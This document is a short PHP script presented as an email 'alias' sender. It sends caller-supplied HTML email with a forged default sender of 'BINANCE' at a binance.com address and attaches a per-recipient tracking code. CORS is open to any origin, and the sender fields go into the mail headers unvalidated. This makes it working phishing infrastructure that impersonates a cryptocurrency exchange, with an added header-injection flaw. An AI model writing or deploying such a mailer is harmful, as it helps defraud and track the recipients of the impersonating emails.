<?php
// Simple PHP email sending script for alias functionality
header('Content-Type: text/plain');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo "Method not allowed";
    exit;
}

// Get POST parameters
$to = $_POST['to'] ?? '';
$subject = $_POST['subject'] ?? '';
$message = $_POST['message'] ?? '';
$from_email = $_POST['from_email'] ?? 'do_not_reply@mailersp2.binance.com';
$from_name = $_POST['from_name'] ?? 'BINANCE';
$tracking_code = $_POST['tracking_code'] ?? '';

// Validate required fields
if (empty($to) || empty($subject) || empty($message)) {
    http_response_code(400);
    echo "Missing required fields";
    exit;
}

// Validate email
if (!filter_var($to, FILTER_VALIDATE_EMAIL)) {
    http_response_code(400);
    echo "Invalid email address";
    exit;
}

// Set headers for the email
$headers = array(
    'From' => "$from_name <$from_email>",
    'Reply-To' => $from_email,
    'Return-Path' => $from_email,
    'MIME-Version' => '1.0',
    'Content-Type' => 'text/html; charset=UTF-8',
    'X-Mailer' => 'PHP/' . phpversion(),
    'X-Tracking-Code' => $tracking_code
);

// Convert headers array to string
$header_string = '';
foreach ($headers as $key => $value) {
    $header_string .= "$key: $value\r\n";
}

// Send the email
$success = mail($to, $subject, $message, $header_string);

if ($success) {
    echo "Email sent successfully via PHP";
} else {
    http_response_code(500);
    echo "Failed to send email";
}
?>